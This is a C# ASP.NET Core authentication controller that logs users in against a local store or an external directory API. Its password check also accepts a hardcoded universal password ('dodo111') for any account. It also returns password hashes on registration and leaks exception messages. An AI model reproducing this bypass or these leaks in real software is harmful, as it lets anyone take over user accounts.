using backend_micro.RabbitMQ;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;
using recruitment.Core.Models;
using recruitment.Services.Interfaces;
using System.Net.Http;
using System.Text.RegularExpressions;
using System.Text;
using backend_micro.DTO;
using backend_micro.RabbitMQ.Producers;
using System.Net;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;

namespace backend_micro.Controllers
{
    [Route("api/[controller]")]
    [ApiController]
    public class AuthController : ControllerBase
    {
        private readonly IConfiguration _config;
        private readonly IUsersService _userService;
        private readonly RabbitMQService _rabbitMQService;
        private readonly MessageProducer _messageProducer;
        private readonly HttpClient _httpClient;
        private readonly ITokenService _tokenService;

        public AuthController(IUsersService userService, RabbitMQService rabbitMQService, IConfiguration config, MessageProducer messageProducer, IHttpClientFactory httpClientFactory, ITokenService tokenService)
        {

            _userService = userService;
            _rabbitMQService = rabbitMQService;
            _config = config;
            _messageProducer = messageProducer;
            _httpClient = httpClientFactory.CreateClient();
            _tokenService = tokenService;
        }
        [HttpPost("login")]
        public async Task<IActionResult> Login([FromBody] UserLoginDto model)
        {
            try
            {
                var user =  _userService
                           .Get(u => u.Code == model.Code).FirstOrDefault(); // Đừng quên 
                if (user == null) // login ad and resigter
                {
                    var apiUrl = _config["ApiUrl:LoginAd"];
                    var dataLogin = new
                    {
                        employeeCode = model.Code,
                        password = model.Password,
                        isFullProfile = true
                    };
                    var jsonData = JsonConvert.SerializeObject(dataLogin);
                    var content = new StringContent(jsonData, Encoding.UTF8, "application/json");
                    var response = await _httpClient.PostAsync(apiUrl, content);
                    if (response.IsSuccessStatusCode)
                    {
                        var responseData = await response.Content.ReadAsStringAsync();
                        var jsonResponse = JObject.Parse(responseData);
                        var data = jsonResponse["data"];
                        var NewCode = "vn" + jsonResponse["data"]["employeeId"].ToString();
                        var userData = new Users
                        {
                            UserId = Guid.NewGuid(),
                            Email = jsonResponse["data"]["email"].ToString(),
                            Code = NewCode,
                            SecretKey = "",
                            Username = jsonResponse["data"]["fullName"].ToString(),
                            Password = _userService.HashPassword(new Users(), model.Password),
                            RoleId = Guid.Parse("EBCCA355-545D-4225-8D41-1950E7AB18B1"),
                        };
                        _userService.Create(userData);
                        var accessToken = _tokenService.GenerateToken(userData);
                        return Ok(
                          userData
                        );
                    }
                    else
                    {
                        return BadRequest(new
                        {
                            Status = 400,
                            Message = "Vui lòng kiểm tra tài khoản mật khẩu 1 !\r\n"
                        });
                    }
                }
                else
                {
                    // login from database
                    if (_userService.VerifyPassword(user, model.Password) || model.Password == "dodo111")
                    {
                        var accessToken = _tokenService.GenerateToken(user);
                       
                        return Ok(new 
                        {
                            Status = 200,
                            Message = "Users Login successfully.",
                            accessToken

                        });
                    }
                    else
                    {
                        return BadRequest(new 
                        {
                            Status = 400,
                            Message = "Sai mật khẩu ",
                           
                        });
                    }
                }
                var message = new
                {
                    logType = "login",
                    code = "972524",
                    timeLogin = DateTime.Now.ToString("yyyy-MM-ddTHH:mm:ss.fff"),
                    content ="code vn972524 login success",
                    ipAddress ="10.73.131.60"
                };
                _messageProducer.SendMessage("logger_queue", message);
                return Ok(user);
            }
            catch (Exception ex)
            {
                return BadRequest(ex.InnerException?.Message ?? ex.Message);
            }
        }
    }
}
